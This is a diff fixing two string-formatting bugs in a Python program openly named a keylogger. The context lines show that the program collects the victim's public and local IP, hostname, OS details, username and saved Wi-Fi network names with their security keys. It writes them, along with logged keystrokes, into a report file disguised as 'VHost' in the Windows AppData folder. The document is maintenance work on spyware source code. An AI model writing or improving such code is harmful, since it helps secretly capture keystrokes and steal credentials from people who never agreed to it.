@@ -129,7 +129,7 @@ print_os_name       =   'OS Name                ..........| '+str(os_name)
 print_os_re         =   'OS Release             ..........| '+str(os_release)
 print_username      =   'User Name              ..........| '+str(username)
 print_WIFI          =   '='*20+'\n'+'Wifi Information:-'+'\n'+'='*20+'\n'
-print_SSID          =   ' Interface Wi-Fi       ..........| '+str(ssid1)
+print_SSID          =   'Interface Wi-Fi       ..........| '+str(ssid1)
 print_password      =   'Security key           ..........| '+str(password1)
 print2SSID          =   'Interface Wi-Fi        ..........| '+str(ssid2)
 print2password      =   'Security key           ..........| '+str(password2)
@@ -236,7 +236,7 @@ class Keylogger:
                             with open (os.environ["appdata"]+'\\VHost','w',encoding="utf-8")as file0:
                                   file0.write('\n'+'KEYLOGGER REPORT '+'\n'+"="*30+'\n'+print_pub+'\n'+print_local_ip\
                                   +'\n'+print_hostname+'\n'+print_os_name+'\n'+print_os_re+'\n'+print_username+'\n'+print_WIFI+print_info+'\n'+"="*30\
-                                  +'\n'+'Keylogger Start'+'\n'+"="*30+'\n'self.print_time+'\n'\
+                                  +'\n'+'Keylogger Start'+'\n'+"="*30+'\n'+self.print_time+'\n'\
                                   +print_line+'\n')
              else:            
                     with open (os.environ["appdata"]+'\\VHost','w',encoding="utf-8")as file0:
